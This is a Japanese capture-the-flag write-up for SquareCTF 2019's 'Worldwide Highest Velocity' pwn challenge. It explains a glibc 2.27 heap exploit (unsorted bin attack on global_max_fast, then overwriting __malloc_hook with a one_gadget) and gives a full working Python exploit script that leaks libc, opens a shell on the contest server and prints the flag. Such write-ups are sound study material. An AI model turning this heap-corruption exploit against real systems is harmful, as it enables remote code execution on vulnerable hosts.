# [pwn 2000pts] Worldwide Highest Velocity - SquareCTF 2019
64-bitで全部有効です。
```
$ checksec -f worldwide_highest_velocity
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   82 Symbols     Yes      0               4       worldwide_highest_velocity
```
tcashと似た問題ですが、secret関数が無くなっています。ということで、0x6f8サイズのmallocとヒープオーバーフローしかありません。
tcacheかfastbinが使えないことには始まらないのでunsorted bin attackで`global_max_fast`を書き換えましょう。これでサイズ0x6f8でもfastbinと同じ扱いになります。問題はfdをどこに持っていくかという点で、fastbinはサイズチェックがあるのでチャンクサイズが0x701みたいな場所を探さなくてはいけません。競技中は頭悪いのでここでしばらく詰まったのですが、mallocだけする分には別に0x700でも問題ありません。（長い間prev_inuseが立ってるものを探してた......）malloc parameterにはtcacheに入る個数を示す7というデータがあるので、0x700は確保できます。malloc parameterの下の方に`__malloc_hook`があるので、これをone gadgetに書き換えれば終わりです。
```python
from ptrlib import *

flag = False
def exploit(stop=False):
    global flag
    if flag: return
    #sock = Process("./worldwide_highest_velocity")
    #sock = Socket("localhost", 6129)
    sock = Socket("wwhv-315c4ee98c95e6ec.squarectf.com", 6129)

    def malloc(index, size):
        sock.sendlineafter("> ", "1")
        sock.sendlineafter("?\n", str(index))
        sock.sendlineafter("size: \n", str(size))
        return

    def write(index, data):
        sock.sendlineafter("> ", "2")
        sock.sendlineafter("?\n", str(index))
        sock.sendafter("data: \n", data)
        return

    def read(index):
        sock.sendlineafter("> ", "3")
        sock.sendlineafter("?\n", str(index))
        r = sock.recvuntil("1) ")
        return r[:-3]

    def free(index):
        sock.sendlineafter("> ", "4")
        sock.sendlineafter("?\n", str(index))
        return
    
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    libc_main_arena = 0x3ebc40
    libc_global_max_fast = 0x3ed940
    libc_mp = 0x3eb280
    libc_one_gadget = [0x10a38c, 0x4f322, 0x4f2c5, 0xe569f, 0xe5858, 0xe585f, 0xe5863, 0x10a398]

    # libc leak
    malloc(0, 0x6f8)
    malloc(1, 0x6f8) # base
    malloc(2, 0)     # base + 0x700
    malloc(3, 0x6f8) # base + 0x700
    free(0)
    malloc(0, 0x6f8)
    libc_base = u64(read(0)[:8]) - libc_main_arena - 96
    logger.info("libc base = " + hex(libc_base))
    
    # modify global_max_fast
    free(0)
    malloc(0, 0)
    free(1)
    payload  = b'A' * 0x6f8 + p64(0x701)
    payload += p64(0) + p64(libc_base + libc_global_max_fast - 0x10)
    write(0, payload + b'\n')
    malloc(1, 0x6f8)

    # use mp_
    free(1)
    payload  = b'A' * 0x6f8 + p64(0x701)
    payload += p64(libc_base + libc_mp + 0x57)
    write(0, payload + b'\n')
    malloc(1, 0x6f8)
    malloc(4, 0)
    payload = b'\x00' * 0x19
    payload += b'\x00' * 0x710
    payload += p64(0xfbad2088)
    payload += b'\x00' * 0xc0 + p64(libc_base + libc.symbol("_IO_file_jumps"))
    payload += b'\x00' * 0x150
    payload += p64(libc_base + libc_one_gadget[0])
    write(4, payload + b"\n")
    
    # get the shell!!
    free(3)
    malloc(3, 0x6f8)
    
    sock.interactive()

if __name__ == '__main__':
    exploit(stop=True)
```

いぇい。
```
$ python solve.py 
[+] __init__: Successfully connected to wwhv-315c4ee98c95e6ec.squarectf.com:6129
[+] exploit: libc base = 0x7f3ccc40b000
[ptrlib]$ cat /home/wwhv/flag.txt
[ptrlib]$ Nice job nailing the hardest puzzle! flag-25628006A770E154355A1C86B5F1
```

# 感想
面白かったです。
